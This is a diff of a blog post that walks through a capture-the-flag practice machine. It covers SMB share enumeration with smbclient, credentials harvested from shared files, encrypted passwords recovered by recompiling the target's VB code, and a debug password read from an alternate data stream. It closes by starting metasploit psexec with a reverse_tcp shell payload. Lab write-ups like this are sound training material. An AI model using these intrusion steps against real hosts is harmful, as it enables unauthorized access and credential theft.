@@ -40,7 +40,7 @@ Enter WORKGROUP\root's password:
 SMB1 disabled -- no workgroup available
 {% endhighlight %}
 
-The smbclient command showed that there were several network shares. I went through and connected to each, and found that I was able to login and find possible Usernames in the Users share. I took note of this, as this information is sure to come up later for this box:
+The smbclient command showed that there were several network shares. Smbclient is a tool used for Samba, providing a ftp-like experience for users. I went through and connected to each, and found that I was able to login and find possible Usernames in the `Users` share. I took note of this, as this information is sure to come up later for this box:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Users
@@ -58,7 +58,7 @@ smb: \> dir
                 10485247 blocks of size 4096. 6449754 blocks available
 {% endhighlight %}
 
-I did attempt to access the user shares, but access was denied for each of the directories. Continuing my enumeration of the network shares, I connected to Data, and found I could login to the Shared directory:
+I did attempt to access the user share listed, but access was denied for each of the directories. Continuing my enumeration of the network shares, I connected to `Data`, and found I could login to the `Shared` directory:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Data
@@ -84,7 +84,7 @@ smb: \Shared\> dir
                 10485247 blocks of size 4096. 6449754 blocks available
 {% endhighlight %}
 
-In this directory, I found a file, `Maintenance Alerts.txt`. I used the get command to downlaod the file to my local box, and viewed the file:
+In this directory, I found a file, `Maintenance Alerts.txt`. I used the get command to downlaod the file to my local box, and on my Kali Linux viewed the file:
 
 {% highlight bash linenos %}
 smb: \Shared\Maintenance\> dir
@@ -102,7 +102,7 @@ root@bhax0r:~# cat 'Maintenance Alerts.txt'
 There is currently no scheduled maintenance work
 {% endhighlight %}
 
-However, still nothing! I then went back one directory, and logged into the Templates directory and found another file, "Welcome Email.txt". This sounded pronmising:
+However, still nothing! I then went up one directory, and logged into the `Templates` directory and found another file, `Welcome Email.txt`. This sounded pronmising:
 
 {% highlight bash linenos %}
 smb: \Shared\Templates\HR\> dir
@@ -133,7 +133,7 @@ Password: welcome2019
 Thank you
 {% endhighlight %}
 
-And I found a possible set of credentials, tempuser:welcome2019. Noting the Users directory earlier, I logged back in with these credentials to that directory:
+And I found a possible set of credentials, tempuser:welcome2019! Noting the `Users` directory earlier, I logged back in with these credentials to that network share:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Users -U TempUser
@@ -155,7 +155,7 @@ getting file \TempUser\New Text Document.txt of size 0 as New Text Document.txt 
 root@hax0r:~# cat 'New Text Document.txt' 
 {% endhighlight %}
 
-However, this did not have any further inforamtion for me. I then attempted to login to the Users share with the other usernamers, using the same password (users don't always change default passwords) but this also did not work. So, I moved on and used these credentials agaisnt other shares. I did find that it allowed me into Secure$:
+However, this did not have any further information for me. I then attempted to login to the `Users` share with the other usernames, using the same password (users don't always change default passwords) but this approach also did not work. So, I moved on and used these credentials agaisnt other shares. I did find that it allowed me into `Secure$`:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Secure$ -U TempUser
@@ -171,9 +171,7 @@ smb: \> dir
                 10485247 blocks of size 4096. 6449738 blocks available
  {% endhighlight %}
  
- However, there was nothing within that network share that I could use to my advantage. Moving on, I was able to log into the Data share with the tempuser credentials:
- 
- I found two interesting files in this share, RU_config.xml and config.xml:
+ But, there was nothing within that network share that I could use to my advantage. Moving on, I was able to log into the `Data` share with the tempuser credentials. I was able to find two interesting files in this share, `RU_config.xml` and `config.xml`:
  
  {% highlight bash linenos %}
  smb: \IT\Configs\RU Scanner\> ls
@@ -217,9 +215,9 @@ root@hax0r:~# cat config.xml
 ...
 {% endhighlight %}
 
-Neither of these looked like much at first, but there is relevant and important information. The first, we have a username and password from the RU_config.xml. The second can be easily missed, and this is the second FIle filename variable in config.xml. I can see that in the network share Secure$, there is a Carl directory in the IT directory. In the RU_config.xml, there is a c.smith password, can this be Carl!?
+Neither of these looked like much at first, but there is relevant and important information. FIrst off, we have a username and password from the `RU_config.xml`. The second can be easily missed, and this is the second `File filename` variable in `config.xml`. I can see that in the network share `Secure$`, there is a `Carl` directory within the `IT` directory. In the `RU_config.xml`, there is a `c.smith` password, can this be Carl!?
 
-I logged in and attempted to see if I could get to the Carl directory:
+I logged in and attempted to see if I could get to the `Carl` directory:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Secure$ -U TempUser                                                       
@@ -245,7 +243,7 @@ smb: \IT\Carl\> dir
   VB Projects                         D        0  Tue Aug  6 09:41:55 2019
 {% endhighlight %}
   
-This is important. Note above, that when I was in the Secure$\IT directory, I could not list the contents. However, I could still change to the Carl directory. Awesome! Enumerating these files, I found a RUScanner in VB direcory:
+And that worked! Note above, that when I was in the `Secure$\IT directory`, I could not list the contents. However, I could still change into the `Carl` directory. Awesome! Enumerating these files, I found a `RUScanner` in `VB Projects` direcory:
   
   {% highlight bash linenos %}
   smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\> dir
@@ -264,7 +262,7 @@ This is important. Note above, that when I was in the Secure$\IT directory, I co
                 10485247 blocks of size 4096. 6449951 blocks available'
 {% endhighlight %}
 
-Looking at the Utils.vb file, there are encrypting and decrypting functions. Looking at how these functions work, there is reference to symmetric key creation, using Rfc2898DeriveBytes. Instead of trying to break this encryption, I took the complete file structure, and copied to a Windows machine. Once I had it locally, I was able to compile the code using Visual Studio.
+Looking at the `Utils.vb` file, there are encrypting and decrypting functions. Looking at how these functions work, there is reference to symmetric key creation, using Rfc2898DeriveBytes. Instead of trying to break this encryption, I took the complete file structure, and copied to a Windows machine. Once I had it locally, I was able to compile the code using Visual Studio.
 
 Once compiled and I attempted to run the file, there was an error message:
 
@@ -272,7 +270,7 @@ Once compiled and I attempted to run the file, there was an error message:
 Unhandled Exception: System.IO.FileNotFoundException: Could not find file 'C:\Users\adalzell\Desktop\Nest\RUScanner\bin\Debug\RU_Config.xml'
 {% endhighlight %}
 
-I have the RU_config.xml file, which contains the hash string that looked like base 64! I placed that file into the directory, and when I ran it, the program ran without any exception errors. I then placed a single line of code to write to console the Plain Text in the Utils.vb decrypt function:
+Having `RU_config.xml` file, which contains the hash string that looked like base 64, I placed that file into the directory, and when I ran it, the program ran without any exception errors. I then placed a single line of code to write to console the Plain Text in the `Utils.vb` decrypt function:
 
 
 {% highlight bash linenos %}
@@ -283,14 +281,14 @@ Public Shared Function Decrypt(ByVal cipherText As String, _
 ...
 {% endhighlight %}
 
-And with that, when I compiled the code again, I could see the plain text password!
+And with that, when I compiled the code again, I could see the plain text password:
 
 {% highlight bash linenos %}
 \RUScanner\bin\Debug>DbPof.exe
 xRxRxPANCAK3SxRxRx
 {% endhighlight %}
 
-And now, I am able to connect to the Users share and own user:
+Now, I am able to connect to the `Users` share and own user:
 
 {% highlight bash linenos %}
 smbclient \\\\10.10.10.178\\Users -U C.Smith
@@ -312,7 +310,7 @@ root@hax0r:~# cat user.txt
 xxxxxxxxxxxxxxx4fd827e05f426e987
 {% endhighlight %}
 
-Now to move on to own root. I looked in the HQK Reporting directory, and found a password file:
+Now to move on to own root. I looked in the `HQK Reporting` directory, and found a password file:
 
 {% highlight bash linenos %}
 smb: \C.Smith\HQK Reporting\> ls
@@ -345,7 +343,7 @@ root@hax0r:~# cat "/root/Debug Mode Password.txt:Password"
 WBQ201953D8w 
 {% endhighlight %}
 
-And now, with this password, I can telnet into the box and enable Debug:
+With this password, I can telnet into the box and enable Debug:
 
 {% highlight bash linenos %}
 telnet 10.10.10.178 4386
@@ -382,7 +380,7 @@ User=Administrator
 Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 {% endhighlight %}
 
-Using the RU_config.xml and attempting to decrypt returned a padding error. Looking further into the KqdLdap.exe, I foudn the following code in the CR function:
+Using the `RU_config.xml` I attempted to decrypt returned a padding error. Looking further into the `KqdLdap.exe`, I found the following code in the `CR` function:
 
 {% highlight bash linenos %}
 ' HqkLdap.CR
@@ -395,14 +393,14 @@ Public Shared Function DS(EncryptedString As String) As String
 End Function
 {% endhighlight %}
 
-This is a different set of encryption, different IV, string, and iteration. So, I placed this into the Decryption function of DbPof.exe, and with the administrator hash in the RU_config.xml file, I reran the DbProf.exe program from command prompt, and got the administrator password!
+This is a different set of encryption, different IV, string, and iteration. So, I placed this into the Decryption function of DbPof.exe, and with the administrator hash in the `RU_config.xml` file, I reran the DbProf.exe program from command prompt, and got the administrator password!
 
 {% highlight bash linenos %}
 DbPof.exe
 XtH4nkS4Pl4y1nGX
 {% endhighlight %}
 
-I connected to SMB Share, but there was a shortcut link to the admins desktop. So, I used metasploit (after multiple failed attempts with evil-winrm, impacket psexec.py, and winexec) psexec with reverse_tcp payload:
+I connected to SMB Share, but there was a shortcut link to the admins desktop. This was no good. So, I used metasploit (after multiple failed attempts with evil-winrm, impacket psexec.py, and winexec) psexec with reverse_tcp payload:
 
 {% highlight bash linenos %}
 msf5 > use exploit/windows/smb/psexec
